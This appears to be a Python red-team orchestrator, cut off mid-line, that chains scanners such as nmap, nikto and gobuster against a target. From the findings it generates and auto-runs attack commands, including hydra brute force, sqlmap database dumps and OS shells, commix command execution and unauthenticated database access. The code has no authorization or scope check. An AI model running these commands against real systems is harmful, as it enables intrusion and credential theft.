#!/usr/bin/env python3
"""
Red Team Scan Orchestrator
Runs all available tools against a target, produces a vulnerability report,
and suggests attack options based on findings.
"""

import json
import os
import re
import shutil
import socket
import ssl
import subprocess
import threading
import time
import uuid
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

TOOLS_DIR = os.environ.get("TOOLS_DIR", "/opt/hackingtool-arsenal")

# ══════════════════════════════════════════════════════════════════════════════
# Helpers
# ══════════════════════════════════════════════════════════════════════════════

def _finding(severity, title, detail, evidence="", module=""):
    return {"severity": severity, "title": title, "detail": detail,
            "evidence": evidence, "module": module}

def _attack(name, desc, command, risk, category, context="", look_for=""):
    return {"name": name, "description": desc, "command": command,
            "risk": risk, "category": category,
            "context": context, "look_for": look_for}

def _tool(name):
    return shutil.which(name) is not None

def _tpath(subdir):
    p = os.path.join(TOOLS_DIR, subdir)
    return p if os.path.isdir(p) else None

def _run(cmd, timeout=180):
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True,
                              text=True, timeout=timeout)
        return proc.stdout, proc.stderr, proc.returncode
    except subprocess.TimeoutExpired:
        return "", f"Timed out after {timeout}s", -1
    except Exception as e:
        return "", str(e), -1

def _domain(target):
    if "://" in target:
        return urllib.parse.urlparse(target).hostname or target
    return target.split("/")[0].split(":")[0]

def _url(target):
    if not target.startswith(("http://", "https://")):
        return f"http://{target}"
    return target


def _find_wordlist(kind="users"):
    """Find an available wordlist file on the system."""
    candidates = {
        "users": [
            "/usr/share/wordlists/dirb/others/names.txt",
            "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
            "/usr/share/wordlists/metasploit/unix_users.txt",
        ],
        "passwords": [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/dirb/others/best15.txt",
            "/usr/share/seclists/Passwords/Common-Credentials/best15.txt",
        ],
        "passwords_small": [
            "/usr/share/wordlists/dirb/others/best15.txt",
            "/usr/share/seclists/Passwords/Common-Credentials/best15.txt",
            "/usr/share/wordlists/metasploit/unix_passwords.txt",
        ],
    }
    for p in candidates.get(kind, candidates["users"]):
        if os.path.isfile(p):
            return p
    return None


def _extract_discovered_users(findings):
    """Extract usernames discovered during scanning phases."""
    users = []
    for f in findings:
        title = f.get("title", "")
        for prefix in ("Username: ", "WP User: ", "SMB User: ", "Valid username: "):
            if title.startswith(prefix):
                u = title[len(prefix):].strip()
                if u and u not in users:
                    users.append(u)
    for default in ("admin", "root", "administrator"):
        if default not in users:
            users.append(default)
    return users


def _prepare_attack(cmd, findings):
    """Validate and fix an attack command before auto-execution.
    Returns (fixed_cmd, skip_reason). If skip_reason is set, skip this attack."""
    if not cmd or not cmd.strip():
        return None, "Empty command"
    cmd = cmd.strip()

    # Skip HTML/JS snippets
    if cmd.startswith(("<iframe", "<script", "<img")):
        return None, "Client-side payload (not auto-executable)"

    # Skip plain-text descriptions (not real shell commands)
    first_word = cmd.split()[0] if cmd.split() else ""
    non_executable = ["Use", "Browse", "Check", "Try", "Test", "Configure",
                      "With", "In", "Run", "Go"]
    if first_word in non_executable:
        return None, "Manual/descriptive action"

    # Resolve binary name (handle 'timeout N cmd', 'cd dir && cmd')
    binary = first_word
    if binary == "timeout":
        parts = cmd.split()
        binary = parts[2] if len(parts) > 2 else ""
    if binary == "cd":
        parts = cmd.split("&&")
        if len(parts) > 1:
            binary = parts[1].strip().split()[0]

    # Check if primary binary exists
    builtins = {"echo", "cat", "grep", "head", "tail", "curl", "wget",
                "timeout", "cd", "bash", "sh"}
    if binary and not binary.startswith("/") and binary not in builtins:
        if not shutil.which(binary):
            return None, f"Tool not installed: {binary}"

    # Fix bare wordlist references
    if " users.txt" in cmd and "/usr/share" not in cmd and "/tmp/" not in cmd:
        wl = _find_wordlist("users")
        if wl:
            cmd = cmd.replace(" users.txt", f" {wl}")
        else:
            return None, "No user wordlist available"
    if " pass.txt" in cmd and "/usr/share" not in cmd and "/tmp/" not in cmd:
        wl = _find_wordlist("passwords_small")
        if wl:
            cmd = cmd.replace(" pass.txt", f" {wl}")
        else:
            return None, "No password wordlist available"

    # Write discovered usernames to temp files if referenced
    if "/tmp/users.txt" in cmd or "/tmp/ht_users.txt" in cmd:
        users = _extract_discovered_users(findings)
        if users:
            with open("/tmp/ht_users.txt", "w") as f:
                f.write("\n".join(users) + "\n")
            cmd = cmd.replace("/tmp/users.txt", "/tmp/ht_users.txt")
        else:
            return None, "No usernames discovered for brute force"
    if "/tmp/smb_users.txt" in cmd or "/tmp/ht_smb_users.txt" in cmd:
        smb_users = [f_["title"].replace("SMB User: ", "")
                     for f_ in findings if f_.get("title", "").startswith("SMB User:")]
        if smb_users:
            with open("/tmp/ht_smb_users.txt", "w") as f:
                f.write("\n".join(smb_users) + "\n")
            cmd = cmd.replace("/tmp/smb_users.txt", "/tmp/ht_smb_users.txt")
        else:
            return None, "No SMB usernames discovered"

    # Add timeout wrapper for brute force commands
    if "hydra " in cmd and "timeout " not in cmd:
        cmd = f"timeout 90 {cmd}"
    if "wpscan " in cmd and "--password-attack" in cmd and "timeout " not in cmd:
        cmd = f"timeout 180 {cmd}"
    if "crackmapexec " in cmd and "timeout " not in cmd:
        cmd = f"timeout 90 {cmd}"

    return cmd, None


def _run_live(cmd, scan, timeout=120):
    """Run a command with live output streaming to scan['current_attack']['output']."""
    try:
        proc = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1)
        output = ""
        start = time.time()
        for line in proc.stdout:
            output += line
            if scan and scan.get("current_attack"):
                scan["current_attack"]["output"] = output[-5000:]
            if time.time() - start > timeout:
                proc.kill()
                output += f"\n[Timed out after {timeout}s]\n"
                break
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
        rc = proc.returncode if proc.returncode is not None else -1
        return output, "", rc
    except Exception as e:
        return "", str(e), -1


def detect_type(target):
    target = target.strip()
    if re.match(r'^[\w.+-]+@[\w.-]+\.\w+$', target):
        return "email"
    if re.match(r'^\+?\d[\d\s\-()]{6,}$', target):
        return "phone"
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}$', target):
        return "ip"
    if "://" in target or "." in target:
        return "domain"
    return "username"

# ══════════════════════════════════════════════════════════════════════════════
# Scan Modules — each returns {raw_output, findings[], attacks[]}
# ══════════════════════════════════════════════════════════════════════════════

def mod_dns(target, tt):
    domain = _domain(target)
    F, A, out = [], [], []
    try:
        ips = set(a[4][0] for a in socket.getaddrinfo(domain, None))
        out.append(f"Resolved: {', '.join(ips)}")
        for ip in ips:
            F.append(_finding("info", f"IP: {ip}", f"{domain} → {ip}", module="DNS"))
    except socket.gaierror:
        F.append(_finding("high", "DNS resolution failed", f"Cannot resolve {domain}", module="DNS"))
        return {"raw_output": f"Cannot resolve {domain}", "findings": F, "attacks": A}

    if _tool("dig"):
        for rt in ("A","AAAA","MX","NS","TXT","CNAME"):
            s,_,_ = _run(f"dig +short {domain} {rt}", 10)
            if s.strip():
                out.append(f"{rt}: {s.strip()}")
                if rt == "TXT":
                    for ln in s.strip().split("\n"):
                        if "v=spf1" in ln and "~all" in ln:
                            F.append(_finding("medium", "Weak SPF (softfail)", "~all allows spoofing", evidence=ln, module="DNS"))
                            A.append(_attack("Email Spoofing", "SPF softfail allows forged emails", f"Use SET/GoPhish to spoof @{domain}", "medium", "social_engineering"))
        s,_,_ = _run(f"dig +short _dmarc.{domain} TXT", 10)
        if s.strip():
            F.append(_finding("info", "DMARC record found", s.strip(), module="DNS"))
            if "p=none" in s:
                F.append(_finding("medium", "DMARC policy=none", "Not enforcing email auth", module="DNS"))
        else:
            F.append(_finding("medium", "No DMARC record", "Email spoofing possible", module="DNS"))
            A.append(_attack("Email Spoofing (no DMARC)", "No DMARC policy", f"Spoof emails from @{domain}", "medium", "social_engineering"))

    if _tool("whois"):
        s,_,_ = _run(f"whois {domain}", 15)
        if s.strip():
            out.append(f"\n--- WHOIS ---\n{s[:1500]}")
            for ln in s.split("\n"):
                ll = ln.lower()
                if "registrar:" in ll:
                    F.append(_finding("info", "Registrar", ln.strip(), module="DNS"))
                if "creation" in ll and "date" in ll:
                    F.append(_finding("info", "Created", ln.strip(), module="DNS"))

    return {"raw_output": "\n".join(out), "findings": F, "attacks": A}


def mod_headers(target, tt):
    if not requests:
        return {"raw_output": "requests unavailable", "findings": [], "attacks": []}
    url = _url(target)
    F, A, out = [], [], []
    try:
        r = requests.get(url, timeout=10, verify=False, allow_redirects=True)
        h = r.headers
        out.append(f"HTTP {r.status_code} {r.url}")
        for k,v in h.items():
            out.append(f"  {k}: {v}")

        srv = h.get("Server","")
        if srv:
            F.append(_finding("info", f"Server: {srv}", "Server header disclosed", module="Headers"))
            if any(old in srv.lower() for old in ["apache/2.2","apache/2.0","nginx/1.0","iis/6","iis/7"]):
                F.append(_finding("high", f"Outdated server: {srv}", "Known vulnerabilities likely", module="Headers"))
                A.append(_attack("Exploit old server", f"{srv} has known CVEs", f"searchsploit {srv.split('/')[0]}", "high", "exploitation"))

        xpb = h.get("X-Powered-By","")
        if xpb:
            F.append(_finding("low", f"X-Powered-By: {xpb}", "Tech stack disclosed", module="Headers"))

        missing = {
            "X-Frame-Options": ("medium", "Missing X-Frame-Options → clickjacking"),
            "Strict-Transport-Security": ("medium", "Missing HSTS → downgrade attacks"),
            "Content-Security-Policy": ("medium", "Missing CSP → XSS impact wider"),
            "X-Content-Type-Options": ("low", "Missing X-Content-Type-Options"),
            "X-XSS-Protection": ("low", "Missing X-XSS-Protection"),
        }
        for hdr,(sev,detail) in missing.items():
            if hdr not in h:
                F.append(_finding(sev, f"Missing {hdr}", detail, module="Headers"))

        if "X-Frame-Options" not in h and "Content-Security-Policy" not in h:
            A.append(_attack("Clickjacking test", "No frame protection",
                f"curl -sI {url} 2>&1 | grep -iE 'x-frame|content-security|server'",
                "medium", "client_side",
                context="No X-Frame-Options or CSP frame-ancestors header. Page can be embedded in an iframe for clickjacking attacks.",
                look_for="If neither X-Frame-Options nor Content-Security-Policy appears, the page is clickjackable."))
        if "Strict-Transport-Security" not in h:
            A.append(_attack("HSTS bypass test", "No HSTS header",
                f"curl -sIL http://{_domain(target)} 2>&1 | head -30",
                "medium", "network",
                context="No HSTS header — browsers don't enforce HTTPS. Testing HTTP redirect behavior to check if downgrade attacks are possible.",
                look_for="If HTTP doesn't redirect to HTTPS (or redirects without HSTS), SSL stripping is possible on the same network."))

        sc = h.get("Set-Cookie","")
        if sc:
            if "httponly" not in sc.lower():
                F.append(_finding("medium", "Cookie missing HttpOnly", "JS can read session cookies", module="Headers"))
                A.append(_attack("Cookie flag audit", "HttpOnly missing",
                    f"curl -sI {url} 2>&1 | grep -i set-cookie",
                    "high", "client_side",
                    context="Session cookies lack HttpOnly flag — JavaScript can read them via document.cookie. Any XSS can steal sessions.",
                    look_for="Check Set-Cookie headers for HttpOnly and Secure flags. Missing HttpOnly = JS accessible. Missing Secure = sent over HTTP."))
            if "secure" not in sc.lower():
                F.append(_finding("medium", "Cookie missing Secure flag", "Sent over HTTP", module="Headers"))

        body = r.text[:5000]
        cms = {"WordPress":["/wp-content/","/wp-includes/"], "Drupal":["Drupal.settings"],
               "Joomla":["/components/com_"], "Laravel":["laravel_session"]}
        for name, pats in cms.items():
            if any(p in body for p in pats):
                F.append(_finding("info", f"CMS: {name}", f"Detected in response", module="Headers"))
                if name == "WordPress":
                    A.append(_attack(f"WPScan", "Enumerate WordPress vulns",
                        f"wpscan --url {url} --enumerate u,vp,vt --no-banner --random-user-agent --disable-tls-checks 2>&1 | head -200",
                        "medium", "exploitation"))
                break

    except requests.exceptions.SSLError:
        F.append(_finding("medium", "SSL error", "Self-signed or expired cert", module="Headers"))
    except requests.exceptions.ConnectionError:
        F.append(_finding("high", "Connection refused", f"Cannot connect to {url}", module="Headers"))
    except Exception as e:
        out.append(f"Error: {e}")
    return {"raw_output": "\n".join(out), "findings": F, "attacks": A}


def mod_ssl(target, tt):
    domain = _domain(target)
    F, A, out = [], [], []
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
            s.settimeout(10)
            s.connect((domain, 443))
            cert = s.getpeercert()
            subj = dict(x[0] for x in cert.get('subject',[]))
            iss = dict(x[0] for x in cert.get('issuer',[]))
            out.append(f"Subject: {subj.get('commonName','?')}")
            out.append(f"Issuer: {iss.get('organizationName','?')}")
            out.append(f"Expires: {cert.get('notAfter','?')}")
            F.append(_finding("info", f"SSL issuer: {iss.get('organizationName','?')}", "", module="SSL"))
            na = cert.get('notAfter','')
            if na:
                try:
                    exp = datetime.strptime(na, "%b %d %H:%M:%S %Y %Z")
                    days = (exp - datetime.utcnow()).days
                    out.append(f"Days left: {days}")
                    if days < 0:
                        F.append(_finding("critical", "SSL cert EXPIRED", f"Expired {abs(days)}d ago", module="SSL"))
                    elif days < 30:
                        F.append(_finding("medium", "SSL cert expiring soon", f"{days}d left", module="SSL"))
                except Exception:
                    pass
            sans = [x[1] for x in cert.get('subjectAltName',[])]
            if sans:
                out.append(f"SANs: {', '.join(sans[:10])}")
    except ssl.SSLError as e:
        F.append(_finding("high", "SSL error", str(e), module="SSL"))
    except (socket.timeout, ConnectionRefusedError):
        F.append(_finding("info", "Port 443 closed/timeout", "", module="SSL"))
    except Exception as e:
        out.append(f"Error: {e}")

    if _tool("sslscan"):
        s,_,_ = _run(f"sslscan --no-colour {domain}", 30)
        if s:
            out.append(f"\n{s[:2000]}")
            if "SSLv3" in s or "SSLv2" in s:
                F.append(_finding("high", "Deprecated SSL protocol", "SSLv2/v3 enabled", module="SSL"))
                A.append(_attack("POODLE", "SSLv3 padding oracle", "Use poodle-exploit tool", "high", "network"))
            for w in ["RC4","DES","NULL","EXPORT"]:
                if w in s:
                    F.append(_finding("high", f"Weak cipher: {w}", "", module="SSL"))
    return {"raw_output": "\n".join(out), "findings": F, "attacks": A}


def mod_robots(target, tt):
    if not requests:
        return {"raw_output": "", "findings": [], "attacks": []}
    url = _url(target)
    F, A, out = [], [], []
    try:
        r = requests.get(f"{url}/robots.txt", timeout=10, verify=False)
        if r.status_code == 200 and "Disallow" in r.text:
            out.append(f"--- robots.txt ---\n{r.text[:1500]}")
            F.append(_finding("info", "robots.txt found", "", module="Recon"))
            for ln in r.text.split("\n"):
                if ln.strip().startswith("Disallow:"):
                    path = ln.split(":",1)[1].strip()
                    if path and path != "/":
                        if any(p in path.lower() for p in ["/admin","/api","/private","/secret","/backup","/internal","/.git","/.env"]):
                            F.append(_finding("medium", f"Interesting path: {path}", "Hidden from crawlers", module="Recon"))
                            A.append(_attack(f"Access {path}", "May contain sensitive data", f"curl -s {url}{path}", "medium", "recon"))
    except Exception:
        pass
    try:
        r = requests.get(f"{url}/sitemap.xml", timeout=10, verify=False)
        if r.status_code == 200 and "<url" in r.text.lower():
            cnt = r.text.lower().count("<url")
            F.append(_finding("info", f"Sitemap found ({cnt} URLs)", "", module="Recon"))
    except Exception:
        pass
    return {"raw_output": "\n".join(out), "findings": F, "attacks": A}


def mod_tech(target, tt):
    url = _url(target)
    F, A, out = [], [], []
    if _tool("whatweb"):
        s,_,_ = _run(f"whatweb -a 3 --color=never {url}", 30)
        if s:
            out.append(s)
            for tech in re.findall(r'\[([^\]]+)\]', s):
                if tech and not tech.isdigit() and len(tech) > 1:
                    F.append(_finding("info", f"Tech: {tech}", "", module="Tech"))
    return {"raw_output": "\n".join(out), "findings": F, "attacks": A}


def mod_ports_basic(target, tt):
    """Fallback port scan when nmap unavailable."""
    if _tool("nmap"):
        return {"raw_output": "nmap available, skipping basic scan", "findings": [], "attacks": [], "skipped": True}
    host = _domain(target) if tt in ("domain","url") else target
    F, A, out = [], [], [f"Basic port scan: {host}"]
    ports = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",
             110:"POP3",143:"IMAP",443:"HTTPS",445:"SMB",993:"IMAPS",
             1433:"MSSQL",3306:"MySQL",3389:"RDP",5432:"PostgreSQL",
             5900:"VNC",6379:"Redis",8080:"HTTP-Alt",8443:"HTTPS-Alt",27017:"MongoDB"}
    for port, svc in ports.items():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            if s.connect_ex((host, port)) == 0:
                out.append(f"  {port}/tcp open {svc}")
                F.append(_finding("info", f"Open port {port}/{svc}", "", module="PortScan"))
            s.close()
        except Exception:
            pass
    return {"raw_output": "\n".join(out), "findings": F, "attacks": A}


def mod_nmap(target, tt):
    if not _tool("nmap"):
        return {"raw_output": "nmap not installed", "findings": [], "attacks": [], "skipped": True}
    host = _domain(target) if tt in ("domain","url") else target
    F, A = [], []
    s,e,rc = _run(f"nmap -sV -sC --top-ports 1000 -T4 --open {host}", 300)
    out = s + e
    if rc != 0 and not s:
        return {"raw_output": f"nmap error: {out[:500]}", "findings": [], "attacks": []}

    for port_s, svc, ver in re.findall(r'(\d+)/tcp\s+open\s+(\S+)\s*(.*)', s):
        port = int(port_s)
        ver = ver.strip()
        F.append(_finding("info", f"Port {port}/{svc}", ver or svc, evidence=f"{port}/tcp open {svc} {ver}", module="NMAP"))

        _uwl = _find_wordlist("users") or "/usr/share/wordlists/dirb/others/names.txt"
        _pwl = _find_wordlist("passwords_small") or "/usr/share/wordlists/dirb/others/best15.txt"
        if port == 21 or svc == "ftp":
            F.append(_finding("medium", "FTP exposed", "", module="NMAP"))
            A.append(_attack("FTP anonymous login", "Check anonymous access",
                f"nmap --script ftp-anon -p 21 {host}", "medium", "access"))
            A.append(_attack("FTP brute force", "Test credentials against FTP",
                f"hydra -L {_uwl} -P {_pwl} ftp://{host} -t 4 -f", "medium", "brute_force"))
        if port == 22 or svc == "ssh":
            A.append(_attack("SSH brute force", "Test credentials against SSH",
                f"hydra -L {_uwl} -P {_pwl} ssh://{host} -t 4 -f", "medium", "brute_force"))
            m = re.search(r'OpenSSH[_ ](\d+\.\d+)', ver)
            if m and float(m.group(1)) < 8.0:
                F.append(_finding("high", f"Outdated OpenSSH {m.group(1)}", "", module="NMAP"))
                A.append(_attack("Exploit old SSH", f"OpenSSH {m.group(1)}",
                    f"searchsploit openssh {m.group(1)}", "high", "exploitation"))
        if port == 23:
            F.append(_finding("high", "Telnet exposed", "Plaintext protocol", module="NMAP"))
            A.append(_attack("Telnet banner grab", "Check Telnet service",
                f"nmap --script telnet-ntlm-info -p 23 {host}", "medium", "recon"))
        if port in (80,443,8080,8443) or "http" in svc:
            A.append(_attack(f"Web scan port {port}", "Nikto vulnerability scan",
                f"nikto -h {host}:{port} -maxtime 120 -nointeractive", "medium", "recon"))
        if port == 3306 or svc == "mysql":
            F.append(_finding("high", "MySQL exposed", "", module="NMAP"))
            A.append(_attack("MySQL brute force", "Test credentials against MySQL",
                f"hydra -L {_uwl} -P {_pwl} mysql://{host} -t 4 -f", "high", "brute_force"))
        if port == 5432 or svc == "postgresql":
            F.append(_finding("high", "PostgreSQL exposed", "", module="NMAP"))
            A.append(_attack("PostgreSQL brute force", "Test credentials against PostgreSQL",
                f"hydra -L {_uwl} -P {_pwl} postgres://{host} -t 4 -f", "high", "brute_force"))
        if port == 3389:
            F.append(_finding("medium", "RDP exposed", "", module="NMAP"))
            A.append(_attack("BlueKeep check", "CVE-2019-0708",
                f"nmap --script rdp-vuln-ms12-020 -p 3389 {host}", "critical", "exploitation"))
        if port == 445 or svc == "microsoft-ds":
            F.append(_finding("high", "SMB exposed", "", module="NMAP"))
            A.append(_attack("EternalBlue check", "MS17-010",
                f"nmap --script smb-vuln-ms17-010 -p 445 {host}", "critical", "exploitation"))
            A.append(_attack("SMB enum shares", "List network shares",
                f"smbclient -L //{host}/ -N 2>&1 | head -30", "medium", "recon"))
        if port == 6379:
            F.append(_finding("critical", "Redis exposed", "Often no auth", module="NMAP"))
            A.append(_attack("Redis unauth access", "Test unauthenticated access",
                f"redis-cli -h {host} --no-auth-warning INFO 2>&1 | head -30", "critical", "access"))
        if port == 27017:
            F.append(_finding("critical", "MongoDB exposed", "Often no auth", module="NMAP"))
            A.append(_attack("MongoDB unauth access", "Test unauthenticated access",
                f"mongosh --host {host} --eval 'db.adminCommand({{listDatabases:1}})' --quiet 2>&1 | head -30", "critical", "access"))

    for cve in set(re.findall(r'(CVE-\d{4}-\d+)', s)):
        F.append(_finding("critical", f"CVE: {cve}", "Detected by NMAP scripts", module="NMAP"))
        A.append(_attack(f"Exploit {cve}", "", f"searchsploit {cve}", "critical", "exploitation"))

    return {"raw_output": s[:5000], "findings": F, "attacks": A}


def mod_nikto(target, tt):
    if not _tool("nikto"):
        return {"raw_output": "nikto not installed", "findings": [], "attacks": [], "skipped": True}
    url = _url(target)
    F, A = [], []
    s,e,_ = _run(f"nikto -h {url} -maxtime 180 -nointeractive -C all", 240)
    out = s + e
    for ln in out.split("\n"):
        ln = ln.strip()
        if not ln.startswith("+"):
            continue
        clean = ln.lstrip("+ ")
        if any(k in clean.lower() for k in ["vulnerab","injection","xss","traversal","remote code","rce"]):
            F.append(_finding("high", f"Nikto: {clean[:100]}", clean, module="Nikto"))
        elif any(k in clean.lower() for k in ["interesting","unusual","outdated","OSVDB","directory","listing"]):
            F.append(_finding("medium", f"Nikto: {clean[:100]}", clean, module="Nikto"))
            if "listing" in clean.lower() or "directory" in clean.lower():
                A.append(_attack("Browse exposed dirs", "Directory listing enabled", f"Browse {url}", "medium", "recon"))
    return {"raw_output": out[:5000], "findings": F, "attacks": A}


def mod_dirb(target, tt):
    if not _tool("dirb"):
        return {"raw_output": "dirb not installed", "findings": [], "attacks": [], "skipped": True}
    url = _url(target)
    F, A = [], []
    s,_,_ = _run(f"dirb {url} -r -z 100 -S 2>&1 | head -120", 180)
    for found_url, code_s in re.findall(r'\+ (https?://\S+) \(CODE:(\d+)', s):
        code = int(code_s)
        path = urllib.parse.urlparse(found_url).path
        if code == 200:
            F.append(_finding("info", f"Dir: {path}", f"{found_url}", module="Dirb"))
            if any(p in path.lower() for p in ["/admin","/manager","/phpmyadmin","/wp-admin","/cpanel","/dashboard"]):
                F.append(_finding("high", f"Admin panel: {path}", "", module="Dirb"))
                _uwl = _find_wordlist("users") or "/usr/share/wordlists/dirb/others/names.txt"
                _pwl = _find_wordlist("passwords_small") or "/usr/share/wordlists/dirb/others/best15.txt"
                A.append(_attack("Admin brute force", f"Panel at {path}",
                    f"hydra -L {_uwl} -P {_pwl} {_domain(target)} http-post-form '{path}:username=^USER^&password=^PASS^:invalid' -t 4 -f",
                    "high", "brute_force",
                    context=f"Dirb discovered an admin panel at {path}. Hydra tests common credentials against the login form.",
                    look_for="Look for '[80][http-post-form]' lines with 'login:' and 'password:' — confirmed credentials for the admin panel."))
            if any(p in path.lower() for p in ["/backup","/.git","/.env","/config","/.svn"]):
                F.append(_finding("critical", f"Sensitive path: {path}", "", module="Dirb"))
                A.append(_attack(f"Access {path}", "Sensitive data", f"curl -s {found_url}", "critical", "info_disclosure"))
    return {"raw_output": s[:3000], "findings": F, "attacks": A}


def mod_sublist3r(target, tt):
    sp = _tpath("Sublist3r")
    if not sp and not _tool("sublist3r"):
        return {"raw_output": "sublist3r not installed", "findings": [], "attacks": [], "skipped": True}
    domain = _domain(target)
    F, A = [], []
    cmd = f"cd {sp} && python3 sublist3r.py -d {domain} -t 10" if sp else f"sublist3r -d {domain} -t 10"
    s,e,_ = _run(cmd, 120)
    out = s + e
    subs = set()
    for ln in out.split("\n"):
        m = re.search(r'([a-zA-Z0-9][\w.-]*\.' + re.escape(domain) + r')', ln)
        if m:
            subs.add(m.group(1))
    for sub in sorted(subs):
        F.append(_finding("info", f"Subdomain: {sub}", "", module="Sublist3r"))
    if subs:
        A.append(_attack("Subdomain takeover check", f"{len(subs)} subdomains found", "Check CNAME records for dangling references", "medium", "recon"))
    return {"raw_output": out[:3000], "findings": F, "attacks": A}


def mod_sqlmap(target, tt):
    if not _tool("sqlmap"):
        return {"raw_output": "sqlmap not installed", "findings": [], "attacks": [], "skipped": True}
    url = _url(target)
    F, A = [], []
    s,e,_ = _run(f"sqlmap -u {url} --crawl=2 --batch --smart --risk=1 --level=1 --threads=4 --timeout=10 --retries=1 2>&1 | tail -60", 180)
    out = s
    if "is vulnerable" in out.lower() or "injectable" in out.lower():
        F.append(_finding("critical", "SQL Injection found", "SQLMap confirmed SQLi", evidence=out[-500:], module="SQLMap"))
        pm = re.search(r"Parameter: (\S+)", out)
        param = pm.group(1) if pm else "?"
        A.append(_attack("SQLi dump database", f"Param: {param}", f"sqlmap -u '{url}' --dump --batch", "critical", "injection"))
        A.append(_attack("SQLi OS shell", f"Param: {param}", f"sqlmap -u '{url}' --os-shell --batch", "critical", "injection"))
    else:
        F.append(_finding("info", "SQLMap: no injection found", "Initial crawl clean", module="SQLMap"))
    return {"raw_output": out[:3000], "findings": F, "attacks": A}


def mod_xsstrike(target, tt):
    sp = _tpath("XSStrike")
    if not sp:
        return {"raw_output": "XSStrike not installed", "findings": [], "attacks": [], "skipped": True}
    url = _url(target)
    F, A = [], []
    s,_,_ = _run(f"cd {sp} && python3 xsstrike.py -u {url} --crawl -t 10 --skip 2>&1 | head -80", 120)
    if "vulnerable" in s.lower() or "reflection" in s.lower():
        F.append(_finding("high", "XSS vulnerability", "XSStrike found reflection/vuln", evidence=s[-500:], module="XSStrike"))
        A.append(_attack("XSS exploitation", "XSS confirmed", f"cd {sp} && python3 xsstrike.py -u {url} --crawl", "high", "injection"))
    return {"raw_output": s[:3000], "findings": F, "attacks": A}


def mod_sherlock(target, tt):
    sp = _tpath("sherlock")
    if not sp and not _tool("sherlock"):
        return {"raw_output": "sherlock not installed", "findings": [], "attacks": [], "skipped": True}
    F, A = [], []
    cmd = f"cd {sp} && python3 sherlock {target} --timeout 10 2>&1 | head -60" if sp else f"sherlock {target} --timeout 10 2>&1 | head -60"
    s,_,_ = _run(cmd, 120)
    found = [ln.strip() for ln in s.split("\n") if "http" in ln]
    for acct in found:
        F.append(_finding("info", f"Account: {acct[:80]}", acct, module="Sherlock"))
    if found:
        A.append(_attack("Social engineering recon", f"{len(found)} accounts found", "Use profiles for social engineering", "medium", "social_engineering"))
    return {"raw_output": s[:3000], "findings": F, "attacks": A}


def mod_email(target, tt):
    F, A, out = [], [], []
    domain = target.split("@")[1] if "@" in target else target
    if _tool("dig"):
        s,_,_ = _run(f"dig +short {domain} MX", 10)
        if s.strip():
            out.append(f"MX: {s.strip()}")
            F.append(_finding("info", "Mail servers found", s.strip(), module="Email"))
    F.append(_finding("info", f"Email domain: {domain}", "", module="Email"))

    infoga = _tpath("Infoga")
    if infoga:
        s,_,_ = _run(f"cd {infoga} && python3 infoga.py --domain {domain} --source all 2>&1 | head -40", 60)
        if s:
            out.append(f"\n--- Infoga ---\n{s}")

    for cmd_name in ("theHarvester","theharvester"):
        if _tool(cmd_name):
            s,_,_ = _run(f"{cmd_name} -d {domain} -l 100 -b all 2>&1 | tail -30", 120)
            if s:
                out.append(f"\n--- theHarvester ---\n{s}")
                for e in set(re.findall(r'[\w.+-]+@[\w.-]+\.\w+', s)):
                    F.append(_finding("info", f"Related email: {e}", "", module="Email"))
            break

    A.append(_attack("Phishing campaign", f"Target: {target}", f"Use GoPhish/SET to phish {target}", "medium", "social_engineering"))
    A.append(_attack("Password spray", f"Target: {target}", "Try common passwords on O365/Gmail/etc", "medium", "brute_force"))
    return {"raw_output": "\n".join(out), "findings": F, "attacks": A}


def mod_commix(target, tt):
    if not _tool("commix"):
        cp = _tpath("commix")
        if not cp:
            return {"raw_output": "commix not installed", "findings": [], "attacks": [], "skipped": True}
    url = _url(target)
    F, A = [], []
    cp = _tpath("commix")
    cmd = f"cd {cp} && python3 commix.py -u {url} --crawl=1 --batch 2>&1 | tail -30" if cp else f"commix -u {url} --crawl=1 --batch 2>&1 | tail -30"
    s,_,_ = _run(cmd, 120)
    if "injectable" in s.lower() or "vulnerable" in s.lower():
        F.append(_finding("critical", "Command injection found", "Commix confirmed OS command injection", evidence=s[-500:], module="Commix"))
        A.append(_attack("Command injection → shell", "OS command injection", f"commix -u '{url}' --os-cmd='id'", "critical", "injection"))
    return {"raw_output": s[:3000], "findings": F, "attacks": A}


# ══════════════════════════════════════════════════════════════════════════════
# NEW MODULES — Additional scanners leveraging the full arsenal
# ══════════════════════════════════════════════════════════════════════════════

def mod_gobuster(target, tt):
    """Directory/file brute force with gobuster (faster than dirb)."""
    if not _tool("gobuster"):
        return {"raw_output": "gobuster not installed", "findings": [], "attacks": [], "skipped": True}
    url = _url(target)
    F, A = [], []
    wordlists = [
        "/usr/share/wordlists/dirb/common.txt",
        "/usr/share/dirb/wordlists/common.txt",
        "/usr/share/seclists/Discovery/Web-Content/common.txt",
        "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt",
    ]
    wl = next((w for w in wordlists if os.path.isfile(w)), None)
    if not wl:
        return {"raw_output": "No wordlist found for gobuster", "findings": [], "attacks": []}
    s,e,_ = _run(f"gobuster dir -u {url} -w {wl} -q -t 20 --no-error -z 2>&1 | head -150", 240)
    out = s + e
    for match in re.findall(r'(/\S+)\s+\(Status:\s*(\d+)', out):
        path, code = match[0], int(match[1])
        if code in (200, 301, 302, 403):
            F.append(_finding("info", f"Path: {path} [{code}]", "Found by Gobuster", module="Gobuster"))
            if any(p in path.lower() for p in ["/admin","/login","/wp-admin","/manager","/dashboard","/panel","/cpanel","/phpmyadmin","/signin","/auth"]):
                F.append(_finding("high", f"Admin/Login: {path}", f"HTTP {code}", module="Gobuster"))
                A.append(_attack(f"Brute force {path}", f"Login page at {path}",
